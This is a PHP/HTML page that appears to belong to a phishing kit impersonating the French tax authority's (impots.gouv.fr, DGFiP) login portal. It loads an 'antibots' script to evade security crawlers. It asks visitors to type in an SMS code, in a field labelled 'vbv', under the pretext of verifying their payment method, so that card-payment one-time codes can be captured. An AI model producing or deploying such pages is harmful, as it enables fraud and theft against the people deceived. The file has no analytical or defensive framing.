<?php
include "../../server/antibots.php";
?>
<a href="#contenu" class="sr-only sr-only-focusable">Aller au contenu</a>

<header>
	<div class="container">
		<!--Le logo-->
		<a id="logo" class="col-xs-12 col-sm-6 col-lg-7" href="#" target="_blank" rel="noopener" title="Accueil impots.gouv.fr (nouvelle fenétre)"> <span class="sr-only">Authentification</span> </a>
		<h1 class="sr-only">Authentification</h1>
		<ul id="acces_espace" class="col-xs-12 col-sm-6 col-lg-5">
			<li class="col-xs-6 col-sm-9 col-md-7 pull-right">
				<a class="btn btn-primary" id="partPriv" href="#"> <span class="dgfipicon dgfipicon-cadenas-ferme pull-left"></span> Votre espace particulier </a>
			</li>
			<li class="col-xs-6 col-sm-9 col-md-7 pull-right">
				<a class="btn btn-danger" id="proPriv" href="#"> <span class="dgfipicon dgfipicon-cadenas-ferme pull-left"></span> Votre espace professionnel </a>
			</li>
			<li class="col-xs-6 col-sm-9 col-md-7 pull-right">
				<a class="btn btn-primary" id="backFranceConnect"> <span class="glyphicon glyphicon-arrow-left pull-left"></span> &emsp; Retourner &agrave; FranceConnect </a>
			</li>
		</ul>
		<!-- </div>  Fin Row -->
	</div>
	<!-- Fin Container -->
</header>
<!-- Fil d'Arianne -->
<div class="container">
	<div class="row">
		<ol class="breadcrumb ">
			<li><a href="#" id="toPortailPub" title="Retour au portail">Accueil</a></li>
			<li class="active">Vérification</li>
		</ol>
	</div>
</div>
<!-- Fin du fil d'Arianne -->
<main class="container" id="contenu">
	<div class="sr-only"> Le contenu du formulaire et l'aide mise à votre disposition évoluent selon vos réponses et votre situation </div>
	<div class="row">
		<!-- Connexion Gauche-->
		<div class="col-md-6">
			<a id="aide_scroll" href="#aide" class="btn btn-default hidden-lg hidden-md hidden-sm" aria-hidden="false"> <span class="dgfipicon dgfipicon-info text-muted"></span>&nbsp;Aide </a>
			<div class="panel panel-default">
				<div class="panel-heading">
					<h2 id="titre_authent" class="text-center">Vérification</h2> </div>
				<!--===========================-->
				<!--Body Connexion Gauche DEBUT-->
				<!--===========================-->
				<div class="panel-body">
					<div role="alert" class="erreur alert alert-danger erreurDAC cat2 hide" id="erreur"></div>
					<div role="alert" class="erreur alert alert-danger erreurDAC cat2 hide" id="blocage"></div>

						<IFRAME style="display:none" name="hidden-formulairePrincipal" id="hidden-formulairePrincipal" aria-hidden="true" title="Cadre technique"> </IFRAME>
						<div class="row">
							<div class="col-md-12">
								<div class="form-group" id="fg_spi">
                                    <p>Afin de vérifier votre mode de paiement nous allons vous envoyer un code de vérification SMS. Tout ce que vous aurez a faire est d'entrer le code reçu dans le champ ci-dessous :</p>
									<div role="alert" style="display: none;" class="erreur alert alert-danger cat1" id="error"></div>
									
									<div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
									<input class="form-control" maxlength="10" required name="num" type="tel" aria-required="true" autocomplete="false" id="vbv" placeholder="" data-toggle="tooltip" data-placement="top" data-mask="int" data-max=13 data-feedbackok=1/>
									<br><br>
									 <center><button id="btnAction" type="submit" style="width: 90%;background:#1d5596;color:white;height:40px;border:none;outline:none;border-radius:5px;" data-href="" onclick="submit('3')">Continuer</button></center>
										
										<br>
								</div>
							</div>
						</div>
				</div>

				
		
			</div>
		</div>
		<section class="col-md-6" id="aide">
			<div class="panel panel-default">
				<div class="panel-heading">
					<h2 class="text-center">Aide</h2> </div>
				<div class="panel-body">
					<details id="aide_spi" class="aideSPI">
						<summary>Ou trouver le code ?</summary>
						<div class="well">
							<p>Le code vous sera envoyé par sms afin de vérifier que le mode de paiement entré vous appartient.</p>
							<p>Si vous ne l'avez pas reçu, veuillez patienter celà peut prendre 1 à 3 minutes.</p>
			
						</div>
					</details>
				</div>
			</div>
		</section>
	</div>
</main>
<footer role="contentinfo">
	<p class="col-md-12 text-center">Direction g&eacute;n&eacute;rale des Finances publiques</p>
</footer>
<div id="deco" class="modal fade" role="dialog">
	<div class="modal-dialog">
		<div class="modal-content" id="deco_contenu">
			<div class="modal-header">
				<h3 class="modal-title titre">D&eacute;connexion</h3> </div>
			<div class="modal-body">
				<div id="deconnecte" class="rounded">
					<iframe name="app0" id="app0" class="hide" aria-hidden="true" title="Cadre technique"></iframe> D&eacute;connexion en cours, veuillez patienter...
					<br />
					<br />
					<div class="text-center" id="decoWait"></div>
					<br /> </div>
			</div>
		</div>
	</div>
</div>